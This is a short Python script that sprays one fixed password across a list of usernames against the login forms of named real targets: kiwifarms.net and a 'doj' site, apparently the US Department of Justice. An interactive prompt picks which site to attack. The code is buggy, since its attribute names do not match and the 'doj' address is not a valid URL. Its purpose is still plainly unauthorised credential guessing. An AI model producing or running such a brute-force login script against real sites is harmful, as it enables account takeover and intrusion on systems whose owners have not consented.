import requests

class Stupid:
    def __init__(self, site, running, listing, password):
        self.s = site
        self.r = running
        self.l = listing
        self.p = password
    def start(self):
        eric = open(self.listing, "r")
        for x in eric:
            x = x.strip(" ")
        #print ("Trying to bruteforce", password)
            dictionary = {
                "username": x,
                "Password": self.password,
                "Login": "submit"

            }
            response = requests.post(self.s, data=dictionary)
                #for i in response:
                #   print(i)
            if "Login failed" in response.content:
                print("[-]No valid passwords found")
            else:
                print("[+]Login sucessful")
                print("username:" + x)
        

site1 = Stupid("kiwifarms.net" , False, "content.txt", "ergergerg")
site2 = Stupid("doj", False, "content.txt", "ergergereger")

start = input("Want to start? y/n").lower()
if start == "y":
    sitename = input("which site do you want to scan?")
    if sitename == "kiwi":
        site1.start()
    elif sitename == "doj":
        site2.start()
    else:
        print("Invalid option. there are only two sites declared")
